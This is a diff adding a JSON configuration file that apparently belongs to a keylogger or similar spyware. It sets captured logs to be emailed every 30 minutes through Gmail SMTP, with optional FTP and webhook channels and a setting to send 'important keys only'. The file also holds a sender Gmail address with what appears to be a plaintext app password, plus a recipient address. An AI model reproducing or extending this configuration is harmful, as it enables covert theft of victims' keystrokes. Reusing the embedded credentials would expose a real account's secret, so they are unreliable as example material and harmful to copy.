@@ -1,0 +1,30 @@
+{
+  "EmailSettings": {
+    "Enabled": true,
+    "SmtpServer": "smtp.gmail.com",
+    "SmtpPort": 587,
+    "SenderEmail": "amersheikhhader@gmail.com",
+    "SenderPassword": "hpfk yncp xdhn ytjk",
+    "RecipientEmail": "sdjdndjcn9@gmail.com",
+    "SendIntervalMinutes": 30
+  },
+  "FtpSettings": {
+    "Enabled": false,
+    "Server": "",
+    "Username": "",
+    "Password": "",
+    "RemoteDirectory": "/logs/",
+    "UploadIntervalMinutes": 15
+  },
+  "WebhookSettings": {
+    "Enabled": false,
+    "WebhookUrl": "",
+    "SendImportantKeysOnly": true
+  },
+  "GeneralSettings": {
+    "ComputerName": "",
+    "UserName": "",
+    "MaxQueueSize": 1000,
+    "EnableEncryption": false
+  }
+}
